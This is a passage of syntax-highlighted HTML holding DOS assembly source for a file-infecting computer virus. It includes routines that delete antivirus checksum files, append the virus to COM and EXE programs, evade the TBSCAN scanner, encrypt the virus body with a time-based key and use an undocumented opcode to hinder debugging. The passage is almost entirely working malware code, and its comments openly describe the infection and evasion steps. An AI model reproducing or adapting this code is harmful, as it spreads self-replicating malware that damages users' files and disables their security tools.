    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">attrib</span><span class="sc0">                  </span><span class="sc1">; CX=attributes to set</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">                </span><span class="sc1">; DS:DX=pointer to filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; execute DOS function</span><span class="sc0">

</span><span class="sc5">restore_int24h</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; RESET INTERRUPT VECTOR 24h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">                   </span><span class="sc1">; AH=fnct. number; AL= int number</span><span class="sc0">
    </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">org_int24</span><span class="sc0">               </span><span class="sc1">; DS:DX=Pointer to new routine</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; DOS-function</span><span class="sc0">

</span><span class="sc5">end_infect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                          </span><span class="sc1">; restore registers</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                          </span><span class="sc1">; -""-</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">                            </span><span class="sc1">; -""-</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; back to caller</span><span class="sc0">


</span><span class="sc5">do_it</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; KILL AV CRC FILES</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0">                     </span><span class="sc1">; copy filename in buffer</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
    
                    </span><span class="sc1">; SET ATTRIBUTES ZERO</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4301h</span><span class="sc0">                   </span><span class="sc1">; dos set attributes function</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"JB"</span><span class="sc0">                    </span><span class="sc1">; to avoid endless recursion</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; CX=attributes to set</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">           </span><span class="sc1">; DS:DX=pointer to filename</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; execute DOS function</span><span class="sc0">
    </span><span class="sc6">JC</span><span class="sc0"> </span><span class="sc5">file_not_there</span><span class="sc0">

                    </span><span class="sc1">; DELETE IT!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                     </span><span class="sc1">; dos function number</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer</span><span class="sc0">           </span><span class="sc1">; DS:DX=buffer for file to be killed</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; execute dos function</span><span class="sc0">

</span><span class="sc5">file_not_there</span><span class="sc4">:</span><span class="sc0"> 
    </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; back to caller</span><span class="sc0">


</span><span class="sc5">calculate_header_size</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; Input: AX=low word/DX=high word of size</span><span class="sc0">
    </span><span class="sc1">; Return: AX=size mod 512; DX= size div 512</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; CX = AX</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9d</span><span class="sc0">                      </span><span class="sc1">; CX = CX div 512</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7d</span><span class="sc0">                      </span><span class="sc1">; DX = (DX * 10000h) div 512</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">; DX = new filelength div 512</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0000000111111111b</span><span class="sc0">       </span><span class="sc1">; AX = new filelength mod 512</span><span class="sc0">
    </span><span class="sc6">JZ</span><span class="sc0"> </span><span class="sc5">exit_calculation</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; round it up</span><span class="sc0">
</span><span class="sc5">exit_calculation</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">


</span><span class="sc5">infect_com</span><span class="sc4">:</span><span class="sc0">
                    </span><span class="sc1">; SET FILEPOINTER TO ENUNS</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">                   </span><span class="sc1">; move file pointer relative to end</span><span class="sc0">
                    </span><span class="sc1">; BX already contains handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                      </span><span class="sc1">; CX:DX = -7 (Offset relative to end)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; Do it!</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">                     </span><span class="sc1">; read enuns into a buffer</span><span class="sc0">
                    </span><span class="sc1">; BX already contains file-handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">                       </span><span class="sc1">; Length of enuns</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">enuns</span><span class="sc0">            </span><span class="sc1">; DS:DX=Pointer to buffer</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                         </span><span class="sc1">; Call DOS function</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">viruslength</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc0">           </span><span class="sc1">; add viruslength to enuns word</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">writelength</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">             </span><span class="sc1">; how many bytes to write (plus enuns)</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">size_of_crap</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enuns</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">           </span><span class="sc1">; save original beginning of com file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">org_com_start</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">com_start_l</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filelength</span><span class="sc4">]</span><span class="sc1">; filelength into dx</span><span class="sc0">
    </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                       </span><span class="sc1">; convert to paragraphs</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12h</span><span class="sc0">                     </span><span class="sc1">; add org 100h+fill bytes to segment</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">com_seg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; write to far-jump</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_offs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">restore_com</span><span class="sc0"> </span><span class="sc1">; Relocate Far Jump</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">entry_segm</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">orig_sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">orig_ss</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_for_com</span><span class="sc0">    </span><span class="sc1">; copy new start code for com file</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">com_start_l</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc5">continue_infection_for_both_exe_and_com</span><span class="sc0">

</span><span class="sc5">start_for_com</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                     </span><span class="sc1">; TBSCAN won't analyze COM files starting with this</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">; Relocate far Jump</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">com_seg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_for_com</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                           </span><span class="sc1">; clear prefetch queue</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EAh</span><span class="sc0">                         </span><span class="sc1">; OP-Code far Jump</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Offset</span><span class="sc0">
</span><span class="sc5">com_seg</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; Segment</span><span class="sc0">
</span><span class="sc5">end_com_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">org_com_start</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">end_com_start</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start_for_com</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; ----- ENCRYPTION ROUTINE --------------------------------------------------</span><span class="sc0">

</span><span class="sc5">encrypt</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; Encrypt &amp; write to file</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; bios get time function</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">1Ah</span><span class="sc0">                         </span><span class="sc1">; call the BIOS!</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">decrypt_key</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; DX contains low word of time counter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">encrypt_key</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; and this is our key</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encrypt_add</span><span class="sc0">             </span><span class="sc1">; different key for add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">encrypt_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">             </span><span class="sc1">; store key</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">; change sign</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">int1_decrypt_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">        </span><span class="sc1">; store key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_encryption</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryption_l</span><span class="sc0">
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">end_encryption</span><span class="sc0">        </span><span class="sc1">; clear prefetch queue</span><span class="sc0">
</span><span class="sc5">end_encryption</span><span class="sc4">:</span><span class="sc0">                         </span><span class="sc1">; encrypt until this label</span><span class="sc0">

</span><span class="sc5">encryption_loop</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; get word to be encrypted in AX</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                          </span><span class="sc1">; ADD AX, imm16</span><span class="sc0">
    </span><span class="sc5">encrypt_add</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0C001h</span><span class="sc0">           </span><span class="sc1">; Key</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">                          </span><span class="sc1">; XOR AX, imm16</span><span class="sc0">
    </span><span class="sc5">encrypt_key</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Key</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; Exchange encryption</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; Move encrypted word back in memory</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; let SI point to the next word</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">encryption_loop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">                     </span><span class="sc1">; write virus to file</span><span class="sc0">
                    </span><span class="sc1">; BX holds already the handle</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">writelength</span><span class="sc0">             </span><span class="sc1">; virus-length to write</span><span class="sc0">
    </span><span class="sc6">cwd</span><span class="sc0">                             </span><span class="sc1">; DS:DX=Pointer to Buffer</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">; Call DOS-function</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">org_int21</span><span class="sc0">        </span><span class="sc1">; simulate interrupt call</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">int1_decrypt_add</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">decrypt_add</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc1">; and now decrypt it again...</span><span class="sc0">
    
    </span><span class="sc6">JMP</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">over_int1</span><span class="sc0">

</span><span class="sc1">; ----- END ENCRYPT ---------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; ----- DECRYPTION ROUTINE --------------------------------------------------</span><span class="sc0">

</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">; Decrypt routine</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0F1h</span><span class="sc0">                         </span><span class="sc1">; undocumented int 1 op-code</span><span class="sc0">
</span><span class="sc5">over_int1</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">start_encryption</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">encryption_l</span><span class="sc0">
    
</span><span class="sc5">decryption_loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Get word to be decrypted in AX</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                     </span><span class="sc1">; XCHG Decryption</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">35h</span><span class="sc0">                          </span><span class="sc1">; XOR ax, imm16</span><span class="sc0">
    </span><span class="sc5">decrypt_key</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Key</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">05h</span><span class="sc0">                          </span><span class="sc1">; ADD ax, imm16</span><span class="sc0">
    </span><span class="sc5">decrypt_add</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Key</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                    </span><span class="sc1">; Move decrypted word back in memory</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                          </span><span class="sc1">; let SI point to the next word</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">LOOP</span><span class="sc0"> </span><span class="sc5">decryption_loop</span><span class="sc0">            </span><span class="sc1">; Repeat it!</span><span class="sc0">

    </span><span class="sc6">RET</span><span class="sc0">                             </span><span class="sc1">; Back to caller</span><span class="sc0">

</span><span class="sc1">; ----- END  DECRYPT --------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">int1_handler</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">06C7h</span><span class="sc0">                        </span><span class="sc1">; op-code mov [decrypt_add], int1_decrypt_add</span><span class="sc0">
    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">decrypt_add</span><span class="sc0">
</span><span class="sc5">int1_decrypt_add</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; decryption key</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">virus_end</span><span class="sc4">:</span><span class="sc0">                              </span><span class="sc1">; Lenght to write</span><span class="sc0">

</span><span class="sc5">enuns</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ENUNS"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">; *** DATA ******************************************************************</span><span class="sc0">

</span><span class="sc5">writelength</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">                        </span><span class="sc1">; how many bytes must be written?</span><span class="sc0">

</span><span class="sc5">header</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; EXE-header</span><span class="sc0">
</span><span class="sc5">exe_id</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">length_m</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">length_d</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">segments</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">head</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">mini_para</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">maxi_para</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">stack_seg</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sp_start</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">crc</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ip_start</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">code_seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">relocate</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">end_header</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">dta</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">reserved</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">attrib</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">time</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">date</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">filelength</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fname</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">filename</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">fn_offs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">fn_segm</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">org_int1</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0">
</span><span class="sc5">int1_offs</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
